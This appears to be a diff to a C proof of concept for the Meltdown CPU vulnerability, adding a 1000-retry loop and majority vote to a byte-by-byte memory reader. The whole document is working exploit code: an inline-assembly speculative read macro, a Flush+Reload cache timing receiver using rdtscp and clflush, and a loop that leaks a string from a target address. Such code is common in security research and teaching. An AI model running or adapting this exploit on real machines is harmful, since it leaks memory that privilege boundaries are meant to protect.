@@ -14,10 +14,11 @@
 #endif
 
 #define DEBUG 1
+#define RETRIES 1000
 
+// Downside of this implementation, can't read 0 values 
 #if DEBUG 
 #define MELTDOWN(addr) \
-  INFO("Meltdown running\n"); \
   asm("1:\n movzx (%%rcx), %%rax\n" \
       "shl $12, %%rax\n" \
       "jz 1b\n" \
@@ -61,11 +62,11 @@ int read_byte_from_reciever() {
   int min_idx = -1; 
   for(int i = 0; i < 256; i++) {
     // timing
-    uint64_t addr = &rec[i * 4096];
+    int* addr = &rec[i * 4096];
     int start = __rdtscp(&junk);
     junk = *addr;
     int elapsed = __rdtscp(&junk) - start;
-
+    
     // check time 
     if(elapsed < min_value) {
       min_value = elapsed;
@@ -77,27 +78,54 @@ int read_byte_from_reciever() {
   for(int i = 0; i < 256; i++) {
     _mm_clflush(&rec[i * 4096]);
   }
-
-  #if DEBUG
-  INFO("byte value read: %d\n", min_idx);
-  #endif
   
   return min_idx;
 }
 
-
 char* read_string(char* addr) {
-  char ret[100] = "";
+  char* ret = malloc(100); // 100 characters
+  memset(ret, '\0', 100); // 0 out
+  size_t size = strlen(addr);
 
-  MELTDOWN(addr); 
-  char byte_value = (char)read_byte_from_reciever(addr);
-  while(byte_value) {
+  // get string 
+  for(int i = 0; i < size; i++) {
+    // hit counter`
+    int hit[256];
+    for(int j = 0; j < 256; j++) hit[j] = 0; 
+
+    // do RETRIES
+    for(int j = 0; j < RETRIES; j++) {
+      // meltdown attack into cache 
+      MELTDOWN(addr);
+      
+      // recieve 
+      int value = read_byte_from_reciever(addr);
+
+      hit[value]++; 
+    }
+
+    // find max
+    int max = 0;
+    int max_idx = -1;
+    for(int j = 0; j < 256; j++) {
+      if(hit[j] > max) {
+	max = hit[j];
+	max_idx = j;
+      }
+    }
+    
+    // add ret
+    char byte_value = (char)max_idx;
     strncat(ret, &byte_value, 1); //concatenate strings
+   
+#if DEBUG
+    INFO("byte value read: %d\n", max_idx);
+#endif
+    
+    // next byte 
     addr++;
-    MELTDOWN(addr);
-    byte_value = (char)read_byte_from_reciever(addr);
   }
-  
+   
   return ret; 
 }
 
@@ -110,7 +138,7 @@ int main(void) {
 
   // attempt read
   char *guess = read_string(secret);
-  ERROR("String is: %s", guess);
+  ERROR("String is: %s\n", guess);
   
   return 0;
 }
